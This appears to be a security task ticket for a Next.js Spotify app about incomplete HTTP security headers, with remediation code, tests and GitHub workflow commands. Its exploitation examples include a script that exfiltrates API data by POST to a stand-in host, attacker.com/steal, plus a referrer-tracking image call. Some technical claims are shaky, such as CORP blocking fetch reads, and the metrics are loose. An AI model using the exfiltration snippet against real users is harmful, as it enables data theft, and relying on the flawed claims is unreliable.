# 🟡 SEC-011: Incomplete Security Headers

## 📋 Basic Information

| Field | Value |
|-------|-------|
| **Vulnerability ID** | SEC-011 |
| **Severity** | Medium |
| **CVSS Score** | 4.8 |
| **Component** | HTTP Security |
| **Location** | `app/api/config/route.ts:6-12` |
| **Discovery Date** | 10/04/2025 |
| **Status** | Open |

## 🎯 Description

Missing important security headers such as `Referrer-Policy`, `Permissions-Policy`, and `Cross-Origin-Embedder-Policy`. This incomplete header configuration leaves the application vulnerable to information leakage, cross-origin attacks, and privacy violations.

### Potential Impact

- Information leakage through referrer headers
- Unauthorized cross-origin embedding
- Cross-origin resource sharing vulnerabilities
- Privacy violations through browser feature access
- Reduced security posture against modern web threats

### Exploitation Examples

```html
<!-- Information leakage through missing Referrer-Policy -->
<!-- Attacker can track user navigation across sites -->
<img src="https://attacker.com/track?referrer=document.referrer" />

<!-- Cross-origin embedding due to missing COOP/COEP -->
<!-- Attacker can embed the site in malicious contexts -->
<iframe src="https://yourapp.com/sensitive-page"></iframe>

<!-- Browser feature access due to missing Permissions-Policy -->
<!-- Malicious scripts can access camera, microphone, etc. -->
<script>
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(stream => {
      // Send video to attacker server
    });
</script>

<!-- Cross-origin data theft due to missing CORP -->
<script>
  fetch('https://yourapp.com/api/sensitive-data')
    .then(response => response.json())
    .then(data => {
      // Send data to attacker
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

### Evidence Found

```typescript
// app/api/config/route.ts - Incomplete security headers
export async function GET(request: NextRequest) {
  const response = NextResponse.json(config || { 
    clientId: "", 
    clientSecret: "", 
    redirectUri: "" 
  });
  
  // BASIC HEADERS ONLY - missing many important security headers
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  
  // MISSING HEADERS:
  // - Referrer-Policy
  // - Permissions-Policy
  // - Cross-Origin-Embedder-Policy
  // - Cross-Origin-Opener-Policy
  // - Cross-Origin-Resource-Policy
  // - Strict-Transport-Security
  // - Content-Security-Policy
  
  return response;
}
```

## 🔧 Remediation Plan

### Specific Actions Required

1. Implement complete security headers
2. Add Referrer-Policy
3. Implement Permissions-Policy
4. Add Cross-Origin headers

### Detailed Remediation Steps

#### Step 1: Comprehensive Security Headers

Create complete security headers configuration:

```typescript
// app/lib/security-headers.ts
import { NextResponse } from 'next/server';

export interface SecurityHeaderConfig {
  environment: 'development' | 'production' | 'staging';
  enableHSTS: boolean;
  enableCSP: boolean;
  customDomain?: string;
}

export class SecurityHeadersManager {
  private config: SecurityHeaderConfig;
  
  constructor(config: SecurityHeaderConfig) {
    this.config = config;
  }
  
  addSecurityHeaders(response: NextResponse): NextResponse {
    const headers = this.getAllSecurityHeaders();
    
    Object.entries(headers).forEach(([key, value]) => {
      response.headers.set(key, value);
    });
    
    return response;
  }
  
  private getAllSecurityHeaders(): Record<string, string> {
    const headers: Record<string, string> = {
      // Content type protection
      'X-Content-Type-Options': 'nosniff',
      
      // Frame protection
      'X-Frame-Options': 'DENY',
      
      // XSS protection (legacy but still useful)
      'X-XSS-Protection': '1; mode=block',
      
      // Referrer policy
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      
      // Permissions policy
      'Permissions-Policy': this.getPermissionsPolicy(),
      
      // Cross-origin policies
      'Cross-Origin-Embedder-Policy': 'require-corp',
      'Cross-Origin-Opener-Policy': 'same-origin',
      'Cross-Origin-Resource-Policy': 'same-origin',
    };
    
    // HSTS for HTTPS
    if (this.config.enableHSTS && this.config.environment === 'production') {
      headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload';
    }
    
    // CSP
    if (this.config.enableCSP) {
      headers['Content-Security-Policy'] = this.getCSPHeaders();
    }
    
    return headers;
  }
  
  private getPermissionsPolicy(): string {
    const policies = [
      'camera=()',
      'microphone=()',
      'geolocation=()',
      'payment=()',
      'usb=()',
      'magnetometer=()',
      'gyroscope=()',
      'accelerometer=()',
      'ambient-light-sensor=()',
      'autoplay=(self)',
      'clipboard-read=()',
      'clipboard-write=(self)',
      'fullscreen=(self)',
      'geolocation=(self)',
      'midi=()',
      'payment=()',
      'picture-in-picture=(self)',
      'speaker=()',
      'sync-xhr=(self)',
      'usb=()',
      'vr=()',
      'web-share=(self)'
    ];
    
    return policies.join(', ');
  }
  
  private getCSPHeaders(): string {
    const isProduction = this.config.environment === 'production';
    
    const directives = [
      'default-src \'self\'',
      `script-src ${isProduction ? '\'self\'' : '\'self\' \'unsafe-inline\' \'unsafe-eval\''}`,
      'style-src \'self\' \'unsafe-inline\'',
      'img-src \'self\' data: https:',
      'font-src \'self\'',
      'connect-src \'self\' https://api.spotify.com',
      'frame-ancestors \'none\'',
      'frame-src \'none\'',
      'form-action \'self\'',
      'base-uri \'self\'',
      'manifest-src \'self\'',
      'worker-src \'self\' blob:',
      'object-src \'none\'',
      'media-src \'self\'',
      'prefetch-src \'self\''
    ];
    
    if (isProduction) {
      directives.push('upgrade-insecure-requests');
    }
    
    return directives.join('; ');
  }
}

// Default configuration
export const defaultSecurityConfig: SecurityHeaderConfig = {
  environment: (process.env.NODE_ENV as 'development' | 'production' | 'staging') || 'development',
  enableHSTS: process.env.NODE_ENV === 'production',
  enableCSP: true,
  customDomain: process.env.CUSTOM_DOMAIN
};

// Default instance
export const securityHeadersManager = new SecurityHeadersManager(defaultSecurityConfig);
```

#### Step 2: API Route Integration

Update all API routes with comprehensive security headers:

```typescript
// app/api/config/route.ts (updated)
import { securityHeadersManager } from '@/app/lib/security-headers';

export async function GET(request: NextRequest) {
  const response = NextResponse.json(config || { 
    clientId: "", 
    clientSecret: "", 
    redirectUri: "" 
  });
  
  // Apply comprehensive security headers
  return securityHeadersManager.addSecurityHeaders(response);
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    
    // Process request...
    
    const response = NextResponse.json({ success: true });
    
    // Apply comprehensive security headers
    return securityHeadersManager.addSecurityHeaders(response);
    
  } catch (error) {
    const response = NextResponse.json(
      { error: 'Invalid request' },
      { status: 400 }
    );
    
    // Apply security headers even to error responses
    return securityHeadersManager.addSecurityHeaders(response);
  }
}
```

#### Step 3: Middleware for Automatic Header Application

Create middleware for automatic header application:

```typescript
// middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { securityHeadersManager } from './app/lib/security-headers';

export function middleware(request: NextRequest) {
  const response = NextResponse.next();
  
  // Apply security headers to all responses
  return securityHeadersManager.addSecurityHeaders(response);
}

export const config = {
  matcher: [
    /*
     * Match all request paths except for the ones starting with:
     * - api (API routes handled separately)
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     */
    '/((?!api|_next/static|_next/image|favicon.ico).*)',
  ],
};
```

#### Step 4: Dynamic CSP for Different Pages

Create dynamic CSP based on page requirements:

```typescript
// app/lib/dynamic-csp.ts
import { NextRequest } from 'next/server';

export interface CSPContext {
  page: string;
  nonce?: string;
  hasSpotifyIntegration: boolean;
  hasExternalScripts: boolean;
}

export class DynamicCSPManager {
  generateCSP(context: CSPContext): string {
    const baseDirectives = [
      'default-src \'self\'',
      'frame-ancestors \'none\'',
      'frame-src \'none\'',
      'form-action \'self\'',
      'base-uri \'self\''
    ];
    
    // Script sources
    const scriptSources = ['\'self\''];
    if (context.nonce) {
      scriptSources.push(`'nonce-${context.nonce}'`);
    } else if (context.hasExternalScripts) {
      scriptSources.push('\'unsafe-inline\'');
    }
    
    // Style sources
    const styleSources = ['\'self\'', '\'unsafe-inline\''];
    
    // Connect sources
    const connectSources = ['\'self\''];
    if (context.hasSpotifyIntegration) {
      connectSources.push('https://api.spotify.com');
    }
    
    // Image sources
    const imageSources = ['\'self\'', 'data:'];
    if (context.hasSpotifyIntegration) {
      imageSources.push('https://i.scdn.co', 'https://mosaic.scdn.co');
    }
    
    const directives = [
      ...baseDirectives,
      `script-src ${scriptSources.join(' ')}`,
      `style-src ${styleSources.join(' ')}`,
      `img-src ${imageSources.join(' ')}`,
      `font-src \'self\'`,
      `connect-src ${connectSources.join(' ')}`,
      'object-src \'none\'',
      'media-src \'self\'',
      'manifest-src \'self\''
    ];
    
    return directives.join('; ');
  }
}

export const dynamicCSPManager = new DynamicCSPManager();
```

#### Step 5: Page-Specific Header Configuration

Implement page-specific security headers:

```typescript
// app/layout.tsx (updated)
import { securityHeadersManager } from '@/app/lib/security-headers';
import { dynamicCSPManager } from '@/app/lib/dynamic-csp';

export default function RootLayout({ children }: { children: React.ReactNode }) {
  // Generate nonce for CSP
  const nonce = crypto.randomBytes(16).toString('base64');
  
  return (
    <html lang="en">
      <head>
        <meta
          httpEquiv="Content-Security-Policy"
          content={dynamicCSPManager.generateCSP({
            page: 'root',
            nonce,
            hasSpotifyIntegration: true,
            hasExternalScripts: false
          })}
        />
        <meta httpEquiv="X-Frame-Options" content="DENY" />
        <meta httpEquiv="X-Content-Type-Options" content="nosniff" />
        <meta httpEquiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
        <meta
          httpEquiv="Permissions-Policy"
          content="camera=(), microphone=(), geolocation=(self), payment=(), usb=(), magnetometer=(), gyroscope=()"
        />
      </head>
      <body>
        {children}
      </body>
    </html>
  );
}

// app/config/page.tsx
export default function ConfigPage() {
  return (
    <div>
      {/* Page content */}
    </div>
  );
}

export const metadata = {
  title: "Configuration - Spotify Playlist",
  other: {
    'Cross-Origin-Embedder-Policy': 'require-corp',
    'Cross-Origin-Opener-Policy': 'same-origin',
    'Cross-Origin-Resource-Policy': 'same-origin',
  }
};
```

#### Step 6: Security Header Monitoring

Implement monitoring for security header violations:

```typescript
// app/lib/security-monitor.ts
export interface SecurityViolation {
  type: 'csp-violation' | 'referrer-policy-violation' | 'permissions-policy-violation';
  url: string;
  userAgent: string;
  timestamp: number;
  details: Record<string, unknown>;
}

export class SecurityMonitor {
  private violations: SecurityViolation[] = [];
  
  logViolation(violation: SecurityViolation): void {
    this.violations.push(violation);
    
    // Keep only last 1000 violations
    if (this.violations.length > 1000) {
      this.violations = this.violations.slice(-1000);
    }
    
    // Log to security logger
    logSecurityEvent(SecurityEventType.SECURITY_HEADER_VIOLATION, {} as NextRequest, violation);
    
    // Alert on high-frequency violations
    if (this.getRecentViolationCount(violation.type, 5) > 10) {
      this.sendAlert(violation);
    }
  }
  
  private getRecentViolationCount(type: string, minutes: number): number {
    const cutoff = Date.now() - (minutes * 60 * 1000);
    return this.violations.filter(v => v.type === type && v.timestamp > cutoff).length;
  }
  
  private sendAlert(violation: SecurityViolation): void {
    // Implementation would depend on your alerting system
    console.error('SECURITY ALERT: High frequency of violations detected', violation);
  }
  
  getViolationReport(): {
    total: number;
    byType: Record<string, number>;
    recent: SecurityViolation[];
  } {
    const byType: Record<string, number> = {};
    
    this.violations.forEach(violation => {
      byType[violation.type] = (byType[violation.type] || 0) + 1;
    });
    
    return {
      total: this.violations.length,
      byType,
      recent: this.violations.slice(-10)
    };
  }
}

export const securityMonitor = new SecurityMonitor();
```

### Dependencies Between Fixes

- **Complements:** SEC-007 (clickjacking protection)
- **Independent:** Can be implemented immediately

### Implementation Risks

- **Low:** Possible breakage of legitimate third-party integrations
- **Low:** Need for fine-tuning of CSP policies
- **Minimal:** Minimal implementation complexity

## 🌿 Branch Strategy (According to Project Guidelines)

### Recommended Branch

```bash
git checkout -b fix/security-sec011-security-headers
```

### Example

```bash
git checkout -b fix/security-sec011-security-headers
```

### Pull Request Template

**Title:**

```text
🐛 fix(security): implement fix for SEC-011 - complete security headers
```

**Body:**

```markdown
### ✍️ What was done

This PR implements the security fix for vulnerability SEC-011 (Medium severity) in the HTTP Security component.

* Implemented comprehensive security headers configuration
* Added Referrer-Policy and Permissions-Policy headers
* Implemented Cross-Origin policies (COOP, COEP, CORP)
* Created dynamic CSP generation for different page contexts
* Added security header violation monitoring and alerting

### 📌 Why it matters

Without this change, the application is vulnerable to information leakage, cross-origin attacks, and privacy violations due to missing security headers. Attackers could exploit these gaps to track users, embed content maliciously, and access browser features inappropriately.

This fix ensures comprehensive protection against modern web threats through proper security header configuration and monitoring.

### 🧪 How to test

1. Start the application and navigate to various pages
2. Check response headers for all security headers
3. Test CSP violations and verify reporting
4. Validate cross-origin policies are working
5. Test referrer policy behavior
6. Run security tests: `bun run test:security`

### 📎 Related

Closes #[issue_number]
```

## 🚀 GitHub CLI Commands

### Create Issue

```bash
gh issue create \
  --title "🟡 SEC-011: Incomplete Security Headers" \
  --body-file project-docs/security-tasks/medium/SEC-011-security-headers.md \
  --label "security,medium,SEC-011"
```

### Create Branch and PR

```bash
# Create branch
git checkout -b fix/security-sec011-security-headers

# Push and create PR
git push origin fix/security-sec011-security-headers
gh pr create \
  --title "🐛 fix(security): implement fix for SEC-011 - complete security headers" \
  --body "This PR implements the security fix for vulnerability SEC-011. Refer to the PR template for detailed testing instructions." \
  --label "security,fix"
```

### Update Status

```bash
# Add progress comment
gh issue comment <issue_number> --body "🔄 Status: Implementation in progress"

# Close issue after merge
gh issue close <issue_number> --comment "✅ Resolved via PR #<pr_number>"
```

## 📊 Success Criteria

### Functional Validation

- [ ] Main functionality preserved
- [ ] No regressions introduced
- [ ] Performance maintained

### Security Validation

- [ ] Security headers completely implemented
- [ ] No new vulnerabilities introduced
- [ ] Security tests passing

### Code Validation

- [ ] Code review approved
- [ ] Automated tests passing
- [ ] Documentation updated

## 🧪 Test Plan

### Automated Tests

```typescript
// tests/security/SEC-011.test.ts
describe('SEC-011: Security Headers', () => {
  test('should include all required security headers', async () => {
    const response = await GET(new Request('http://localhost:3000/api/config'));
    
    expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
    expect(response.headers.get('X-Frame-Options')).toBe('DENY');
    expect(response.headers.get('Referrer-Policy')).toBe('strict-origin-when-cross-origin');
    expect(response.headers.get('Permissions-Policy')).toContain('camera=()');
    expect(response.headers.get('Cross-Origin-Embedder-Policy')).toBe('require-corp');
  });
  
  test('should include CSP header', async () => {
    const response = await GET(new Request('http://localhost:3000/api/config'));
    const cspHeader = response.headers.get('Content-Security-Policy');
    
    expect(cspHeader).toContain("default-src 'self'");
    expect(cspHeader).toContain("frame-ancestors 'none'");
  });
});
```

### Manual Tests

- [ ] Manual header inspection
- [ ] Staging environment validation
- [ ] Regression test

### Validation Tools

```bash
# Check security headers
curl -I http://localhost:3000/api/config

# Test with online security header analyzers
# https://securityheaders.com/
# https://observatory.mozilla.org/
```

## 📈 Metrics and Monitoring

### Before/After Metrics

| Metric | Before | After | Improvement |
|--------|--------|-------|-------------|
| Security Headers Score | 3/10 | 10/10 | +233% |
| Information Leakage Risk | High | Minimal | 90% |
| Cross-Origin Security | Low | High | +200% |

### Post-Deploy Monitoring

- [ ] Alerts configured for header violations
- [ ] Dashboard updated with header metrics
- [ ] Logs monitored for CSP violations

## 📚 References

- [Branching Guidelines](../../branching-guidelines.md)
- [Merge Commit Guidelines](../../merge-commit-guidelines.md)
- [Security Vulnerabilities Report](../../../security-vulnerabilities-report.md)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

## 🔄 Change History

| Date | Version | Author | Change |
|-------|--------|-------|--------|
| 10/04/2025 | 1.0 | Security Team | Initial creation |

## 📝 Additional Notes

Security headers should be regularly reviewed and updated based on emerging threats and browser capabilities. Consider implementing CSP reporting to monitor violations and adjust policies accordingly.

---

**Status:** Open  
**Assigned to:** [Responsible name]  
**Due date:** 10/19/2025  
**Priority:** 5  
**Complexity:** Low

## 🚀 Quick Commands

```bash
# Create issue
gh issue create --title "🟡 SEC-011: Incomplete Security Headers" --body-file $(pwd)/project-docs/security-tasks/medium/SEC-011-security-headers.md --label "security,medium,SEC-011"

# Create branch
git checkout -b fix/security-sec011-security-headers

# Create PR
gh pr create --title "🐛 fix(security): SEC-011 - complete security headers" --body "This PR implements the security fix for vulnerability SEC-011. Refer to the PR template for detailed testing instructions." --label "security,fix"

# Tests
bun run test:security
bun run test:unit
bun run build
